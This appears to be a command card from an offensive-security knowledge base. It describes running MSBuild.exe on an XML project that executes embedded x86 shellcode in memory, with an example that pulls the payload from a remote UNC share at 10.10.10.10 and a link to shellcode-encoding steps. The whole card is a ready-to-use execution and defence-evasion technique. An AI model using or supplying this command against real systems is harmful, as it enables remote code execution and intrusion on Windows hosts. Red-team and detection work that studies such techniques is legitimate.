---
type: command
executor: cmd
data: '%windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe $_XML_PATH'
output: null
created_at: '2023-04-06T03:56:16.386980+00:00'
updated_at: '2023-04-10T20:36:24.586607+00:00'
platforms:
  - Windows
tags:
  - execution
  - shellcode
verified: true
validated: true
---

# MSBuild Execute x86 DNS Payload

## Command

```cmd
%windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe $_XML_PATH
```

## Description

Runs MSBuild on a 32-bit XML project to execute embedded shellcode, suitable for x86 targets or WoW64 environments, potentially pulling XML from a network share.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_XML_PATH | Path to XML, local or UNC (e.g., \\10.10.10.10\Shared\dns_raw_stageless_x86.xml) | Yes |

## Examples

### Basic Usage

```cmd
%windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```

### Advanced Usage

```cmd
%windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe /verbosity:minimal $_XML_PATH
```

## Expected Output

Similar to x64: Build succeeded message with no errors. Shellcode runs in-memory.

## Related

- [[procedures/msbuild-shellcode-execution]]
- [[commands/generate-encoded-shellcode]]
